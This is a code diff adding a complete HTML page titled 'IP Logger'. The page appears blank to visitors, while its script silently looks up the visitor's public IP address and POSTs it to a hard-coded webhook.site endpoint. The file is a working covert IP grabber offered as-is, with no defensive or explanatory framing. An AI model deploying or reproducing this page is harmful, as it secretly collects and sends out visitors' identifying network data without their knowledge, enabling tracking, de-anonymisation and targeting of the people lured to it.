@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <!-- Blank Page -->
+    <script>
+        // Webhook URL to send the IP address
+        const webhookUrl = 'https://webhook.site/f78e512a-dd75-4214-a967-2ebe11461fc4';
+
+        // Fetch user's IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+
+                // Send the IP to the webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ ip: userIp })
+                }).then(response => {
+                    console.log('IP sent to webhook:', response.status);
+                }).catch(error => {
+                    console.error('Error sending IP to webhook:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+            });
+    </script>
+</body>
+</html>
